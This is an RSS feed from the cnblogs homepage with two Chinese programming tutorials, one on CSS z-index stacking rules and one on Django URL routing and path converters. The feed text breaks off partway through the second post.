<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>CSS中层叠和CSS的7阶层叠水平（上篇） - 一只菜鸟攻城狮啊</title>
<link>http://www.cnblogs.com/suihang/p/10428754.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/suihang/p/10428754.html</guid>
<description>&lt;p&gt;今天搜索资料时，忽然发现了以前没注意的一个知识点，所以拖过来搞一搞，这个知识点叫做CSS的7阶层叠水平&lt;/p&gt;
&lt;p&gt;在说这个知识之前，我们必须要先了解一个东西以便于我们更好的理解CSS的7阶层叠水平&lt;/p&gt;
&lt;p&gt;这个东西就是z-index属性（此篇为上篇，仅仅讲z-index）&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;基本含义：&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;z-index&lt;/span&gt;通俗来说就是在Z轴上的索引，Z轴是垂直于电脑屏幕的一根轴&lt;/p&gt;
&lt;p&gt;用来设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面，即通常情况下，z-index为2的元素会在z-index为1的元素上面&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;取值情况：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;z-index有三个取值&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;span&gt;auto&lt;/span&gt;：默认。堆叠顺序与父元素相等。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;em&gt;　　&lt;span&gt;number&lt;/span&gt;：&lt;/em&gt;设置元素的堆叠顺序。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;span&gt;inherit&lt;/span&gt;：规定应该从父元素继承 z-index 属性的值。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;特性：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;　　1.支持负值（如果为正数，则离用户更近，为负数则表示离用户更远。）&lt;/p&gt;

&lt;p&gt;　　2.支持CSS3 animation动画；（并没什么实用应用场景）&lt;/p&gt;

&lt;p&gt;　　3.在CSS2.1时代，&lt;span&gt;需要和定位元素配合使用，&lt;/span&gt;如果不考虑CSS3，只有定位元素（position:relative/absolute/fixed/sticky）的z-index才有作用！在CSS3中有例外&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;准则：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　&lt;span&gt;1.后来者居上原则&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;em id=&quot;__mceDel&quot;&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html &lt;/span&gt;&lt;span&gt;lang&lt;/span&gt;&lt;span&gt;=&quot;en&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;viewport&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;width=device-width, initial-scale=1.0&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;http-equiv&lt;/span&gt;&lt;span&gt;=&quot;X-UA-Compatible&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;ie=edge&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Document&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    .a&lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;
        position&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; absolute&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        height&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 400px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        width&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 400px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        background-color&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; yellow；&lt;br/&gt;&lt;/span&gt;&lt;span&gt;}&lt;/span&gt;&lt;span&gt;
    .b&lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;
        position&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; absolute&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        height&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;400px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        width&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 400px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        background&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; red&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        margin-left&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 100px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
         &lt;span&gt;}&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;a&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;b&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;/em&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;运行结果：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1459059/201902/1459059-20190224233652716-462985045.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;解析：我们可以看到，红色作为后来的元素覆盖在之前的元素上了，在未设置z-index的前提下，后来元素会覆盖前面添加到元素，当然实在开启了绝对定位的前提下（不开启绝对定位不能直观的看到效果）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　2.谁大谁先上原则&lt;br/&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　　　&lt;/strong&gt;&lt;span&gt;在.a添加z-index:2,在.b添加z-index:1&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;　　　&lt;strong&gt;&lt;span&gt;运行结果：&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;　　　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1459059/201902/1459059-20190224234241225-1087493861.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;　　解析：&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;通常情况下，z-index越大，层级越高，越在上面&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;　　当发生嵌套时，祖先优先原则&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;　　&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html &lt;/span&gt;&lt;span&gt;lang&lt;/span&gt;&lt;span&gt;=&quot;en&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;viewport&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;width=device-width, initial-scale=1.0&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;http-equiv&lt;/span&gt;&lt;span&gt;=&quot;X-UA-Compatible&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;ie=edge&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Document&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    .a&lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;
        position&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; absolute&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        height&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 400px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        width&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 400px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        background-color&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; yellow&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        z-index&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
    &lt;span&gt;}&lt;/span&gt;&lt;span&gt;
    .b&lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;
        position&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; absolute&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        height&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;400px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        width&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 400px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        background&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; red&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        margin-left&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 100px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        z-index&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 1
         &lt;/span&gt;&lt;span&gt;}&lt;/span&gt;&lt;span&gt;
    .a1&lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;
        position&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; absolute&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        height&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 200px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        width&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 200px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        background-color&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; aqua&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
    &lt;span&gt;}&lt;/span&gt;&lt;span&gt;
    .b1&lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;
        position&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; absolute&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        height&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 200px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        width&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 200px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        background-color&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; blue&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
        z-index&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 100
    &lt;/span&gt;&lt;span&gt;}&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;a&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;a1&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;b&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;b1&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;运行结果：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1459059/201902/1459059-20190224234857668-400016633.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;解析：&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;按照前面所说应该是蓝色的格子会在最上面，这里并没有，原因就是祖先优先原则&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　　a的层级大于b的层级，所以a里面的元素会始终在b的上面，即使b的子元素的z-index为10000也没用&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;&lt;span&gt;注意：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　所有主流浏览器都支持 z-index 属性&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　任何的版本的 Internet Explorer （包括 IE8）都不支持属性值 &quot;inherit&quot;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Sun, 24 Feb 2019 15:54:00 +0000</pubDate>
<dc:creator>一只菜鸟攻城狮啊</dc:creator>
<og:description>今天搜索资料时，忽然发现了以前没注意的一个知识点，所以拖过来搞一搞，这个知识点叫做CSS的7阶层叠水平 在说这个知识之前，我们必须要先了解一个东西以便于我们更好的理解CSS的7阶层叠水平 这个东西就是</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/suihang/p/10428754.html</dc:identifier>
</item>
<item>
<title>django中url路由配置及渲染方式 - 不打烊的热情</title>
<link>http://www.cnblogs.com/bdydrq/p/10423125.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bdydrq/p/10423125.html</guid>
<description>&lt;p&gt;　　今天我们学习如何配置url、如何传参、如何命名、以及渲染的方式，内容大致有以下几个方面。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;创建视图函数并访问&lt;/li&gt;
&lt;li&gt;创建app&lt;/li&gt;
&lt;li&gt;django中url规则&lt;/li&gt;
&lt;li&gt;捕获参数&lt;/li&gt;
&lt;li&gt;路径转换器&lt;/li&gt;
&lt;li&gt;正则表达式&lt;/li&gt;
&lt;li&gt;额外参数&lt;/li&gt;
&lt;li&gt;渲染方式&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;
&lt;p&gt;　　项目中自带的Python文件中，并没有带有视图，因此我们自己创建一个，通常，我们把视图命名views.py。&lt;/p&gt;
&lt;p&gt;　　然后在views.py中，导入头文件&lt;/p&gt;

&lt;p&gt; 　　　 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;from&lt;/span&gt; django.http &lt;span&gt;import&lt;/span&gt; HttpResponse&lt;/span&gt; &lt;/p&gt;

&lt;p&gt;　　然后我们在views.py中，写一些Python函数，用来访问&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;def&lt;/span&gt;&lt;span&gt; hello（request）：                          /*request用户的请求 */
    
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; HttpResponse（‘hello，欢迎来到django’）
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　在url.py中为视图函数配置路由&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; django.urls &lt;span&gt;import&lt;/span&gt;&lt;span&gt; path
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; .  &lt;span&gt;import&lt;/span&gt;&lt;span&gt; views

urlpatterns &lt;/span&gt;=&lt;span&gt; [
    path(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,hello),       
]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; 　　运行项目，如果上传方式是Ctrl+S的话，记得上传之后再运行，成功后&lt;/p&gt;
&lt;p&gt;　　浏览器输入  127.0.0.1:8000/hello    即可访问到&lt;/p&gt;

&lt;hr/&gt;


&lt;p&gt;　　创建APP的方式不只一种，在虚拟机里可以创建，也可以在pycharm里创建&lt;/p&gt;
&lt;p&gt;　&lt;span&gt;　命令为：Python manage.py startapp appname&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　在虚拟机里创建完，要在pycharm中下载下来&lt;/p&gt;

&lt;p&gt;在pycharm中创建：&lt;/p&gt;
&lt;p&gt;    方式一：&lt;/p&gt;
&lt;p&gt;　　项目运行成功后，在terminal里面找到本项目，输入命令 Python manage.py startapp appname&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1605636/201902/1605636-20190223200020427-170142512.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　如果没有连接本地，则需要重新连接&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1605636/201902/1605636-20190223200122558-1632328932.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　方式二：&lt;/p&gt;
&lt;p&gt;　　　&lt;span&gt;　tool   ----&amp;gt;   run manage.py projectname&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1605636/201902/1605636-20190223175950464-687525820.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1605636/201902/1605636-20190223180053996-824229174.png&quot; alt=&quot;&quot;/&gt; 　　&lt;/p&gt;

&lt;p&gt;　&lt;span&gt;　 startapp appname&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　此方法也需要下载下来&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1605636/201902/1605636-20190223180937623-768758014.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1605636/201902/1605636-20190223181547594-756558618.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;下载完成后，创建的app就出现了。&lt;/p&gt;





&lt;hr/&gt;

&lt;h3&gt;1、网址组成&lt;/h3&gt;
&lt;p&gt;　　　　网址：全球统一资源定位符&lt;/p&gt;
&lt;p&gt;　　　　https://www.i.cnblogs.com/EditPosts.aspx?postid=10423125&lt;/p&gt;
&lt;p&gt;　　　　这是本文网址，做个栗子吧&lt;/p&gt;
&lt;p&gt;　　　　&lt;span&gt;https://&lt;/span&gt;&lt;span&gt;www.i.cnblogs.com/&lt;/span&gt;&lt;span&gt;EditPosts.aspx?&lt;/span&gt;&lt;span&gt;postid=10423125&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　　　&lt;span&gt;协议     &lt;span&gt;         域名             &lt;span&gt;         路径          &lt;/span&gt; &lt;span&gt;        参数            &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;　　　　&lt;/span&gt;&lt;span&gt;django只搜索路径部分，与其他都无关&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt; 2、django的路由系统&lt;/h3&gt;
&lt;p&gt; 　　　　当一个请求来到&lt;/p&gt;
&lt;p&gt;　　　　1、首先到项目目录下，url.py里查找路由规则&lt;/p&gt;
&lt;p&gt;　　　　2、跟urlconf模块，里面定义了urlpatterns变量&lt;/p&gt;
&lt;p&gt;　　　　3、按顺序运行每一个，到第一个匹配的模式停止&lt;/p&gt;
&lt;p&gt;　　　　4、一旦匹配，django导入并调用给定的视图&lt;/p&gt;
&lt;p&gt;　　　　5、如果没有匹配到，或者中间出错，则返回404&lt;/p&gt;

&lt;h3&gt;3、path里参数的含义&lt;/h3&gt;

&lt;p&gt;　　　　path（route，view，kwargs=None，name=None）&lt;/p&gt;
&lt;ul&gt;&lt;li&gt; route   ：   （必须有）是一个字符串的url规则&lt;/li&gt;
&lt;li&gt;view      ：  （必须有）是个视图&lt;/li&gt;
&lt;li&gt;kwargs   ：（可有可无）额外参数，是字典类型，传递给view&lt;/li&gt;
&lt;li&gt;name     ：（可有可无）url名字&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;4、在url中捕获参数&lt;/h3&gt;

&lt;p&gt; 　　尖括号   &amp;lt; 参数  &amp;gt; 可以捕获参数，传递给视图&lt;/p&gt;
&lt;p&gt;　　本来捕获的值是字符串&lt;/p&gt;
&lt;p&gt;　　如果要捕获两个参数，尖括号间可用/斜杠,也可用-连接符，但访问要一致&lt;/p&gt;

&lt;h3&gt;5、路径转化器&lt;/h3&gt;

&lt;p&gt;　　如果想要让捕获的参数符合条件，那么我们会用到路径转化器&lt;/p&gt;
&lt;p&gt;　　符号是冒号 &lt;strong&gt;  ：       &lt;/strong&gt;&lt;em&gt;eg:&amp;lt;int:age&amp;gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;　　常用的路径转化器&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;　　&lt;span&gt;int   ：    匹配任意整数&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;em&gt;　　path  :   匹配任意非空字符&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;em&gt; 　　str    :   匹配除了 / 路径分隔符外所有字符串&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;
